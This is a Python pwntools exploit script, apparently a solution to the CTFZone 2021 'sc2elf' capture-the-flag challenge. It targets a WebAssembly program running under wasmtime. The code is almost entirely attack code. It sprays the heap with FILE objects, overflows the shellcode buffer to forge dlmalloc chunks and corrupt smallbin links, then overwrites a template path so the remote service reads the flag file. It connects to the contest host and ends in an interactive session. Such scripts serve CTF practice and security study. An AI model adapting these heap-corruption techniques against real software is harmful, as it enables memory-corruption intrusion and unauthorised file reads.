#!/usr/bin/env python3
import threading

from pwn import *

g_kaboomfp = None


def connect():
    if args.LOCAL:
        return gdb.debug(
            [
                os.path.expanduser("~/.wasmtime/bin/wasmtime"),
                "-g",
                "sc2elf.wasm",
                "--dir",
                "./",
            ],
            api=True,
        )
    else:
        return remote("sc2elf.2021.ctfz.one", 31337)


PROMPT = "5. Exit"


def prompt(tube, choice):
    data = f"{choice}\n"
    g_kaboomfp.write(data)
    tube.sendafter(PROMPT, data)


def set_shellcode(tube, shellcode):
    prompt(tube, 1)
    data = base64.b16encode(shellcode).decode() + "\n"
    g_kaboomfp.write(data)
    tube.sendafter("Paste base16 encoded shellcode:", data)


def set_header(tube, header):
    prompt(tube, 2)
    data = base64.b16encode(header).decode() + "\n"
    g_kaboomfp.write(data)
    tube.sendafter("Paste base16 encoded header:", data)


def get_result_send(tube):
    prompt(tube, 3)


def get_result_recv(tube):
    tube.recvuntil("Result: ")
    return bytes.fromhex(tube.recvline().decode())


def get_result(tube):
    get_result_send(tube)
    return get_result_recv(tube)


def print_description(tube):
    prompt(tube, 4)


def exit(tube):
    prompt(tube, 5)


def finish(tube):
    tube.gdb.execute("finish &")
    time.sleep(0.1)
    while True:
        try:
            tube.gdb.parse_and_eval("$rip")
        except tube.gdb.error as ex:
            if "gdb.error: Selected thread is running." in ex:
                continue
            raise
        finally:
            break
    time.sleep(0.1)
    tube.gdb.wait()


PINUSE_BIT = 1
CINUSE_BIT = 2
PATH_ADDR = 2040
PATH_OFFSET = 96  # 0x000a3631
FLAG_PATH = "/home/ctf/task/flag.txt"
SIZEOF_FILE = 1144


def main():
    print(
        """
initial heap state:
hdr(8+84+4) - shell(8+160+8) - result(8+244+4)
hdr@   0x00011db0
shell@ 0x00011e10
result@0x00011ec0
(lldb) x/16bx __vmctx->memory+0x00011ec0-8
0x7ffe60011eb8: 0x00 0x00 0x00 0x00 0x03 0x01 0x00 0x00
0x7ffe60011ec0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
"""
    )

    global g_kaboomfp
    with connect() as tube, open("kaboom", "w") as g_kaboomfp:
        if args.LOCAL:
            tube.gdb.execute("set pagination off")
            tube.gdb.continue_nowait()
        print(
            """
Fill the address space with FILE objects to cover addresses like 0x000a3631.
"""
        )
        count = 600  # (0x000a3631 - 0x00011db0) / SIZEOF_FILE
        for _ in range(count):
            set_header(tube, b"\x00" * 84)
            get_result(tube)
        print(
            """
Prevent fopen() in get_result().
"""
        )
        set_header(
            tube,
            flat(
                {
                    0: b"\x7fELF",
                },
                length=84,
            ),
        )

        print(
            """
Bug: shellcode buffer overflow.
1) Increase config.shellcode_size.
2) The size of the result chunk is > 236, therefore it goes into the treemap.
   Make life easier and replace it with two forged chunks.
"""
        )
        set_shellcode(
            tube,
            b"S" * 168
            + struct.pack("<II", 0, 192 | PINUSE_BIT | CINUSE_BIT)
            + b"s" * (192 - 8)
            + struct.pack("<II", 0, 64 | PINUSE_BIT | CINUSE_BIT)
            + b"s" * (64 - 8),
        )

        print(
            """
Reallocate the result.
Bug: the shellcode pointer is not updated.
The first forged result chunk ends up in the smallbin-192:
(lldb) x/2w __vmctx->memory+0x000013e8+8
0x7ffe600013f0: 0x00011eb8 0x00011eb8
"""
        )
        get_result(tube)

        print(
            """
Overwrite the smallbin links in the freed forged result chunk.
Repair the next forged chunk, which was damaged by the overflow in get_result().
"""
        )
        set_shellcode(
            tube,
            b"S" * 168
            + struct.pack(
                "<IIII",
                0,
                192 | PINUSE_BIT,
                PATH_ADDR - PATH_OFFSET - 8,
                PATH_ADDR - PATH_OFFSET - 8,
            )
            + b"s" * (192 - 8 - 8)
            + struct.pack("<II", 0, 64 | CINUSE_BIT)
            + b"s" * (64 - 8),
        )

        print(
            """
Change the shellcode size so that the result chunk size becomes 192.
"""
        )
        set_shellcode(
            tube,
            flat(
                {
                    PATH_OFFSET - 84: FLAG_PATH,
                },
                length=192 - 8 - 84,
            ),
        )

        print(
            """
Overwrite the template path.
"""
        )
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            tube.gdb.Breakpoint("dlmalloc", temporary=True)
            tube.gdb.continue_nowait()
        get_result_send(tube)
        if args.LOCAL:
            tube.gdb.wait()
            finish(tube)
            eax = int(tube.gdb.parse_and_eval("$eax"))
            print(hex(eax))
            assert eax == PATH_ADDR - PATH_OFFSET
            tube.gdb.continue_nowait()

        g_kaboomfp.flush()
        tube.interactive()


if __name__ == "__main__":
    main()
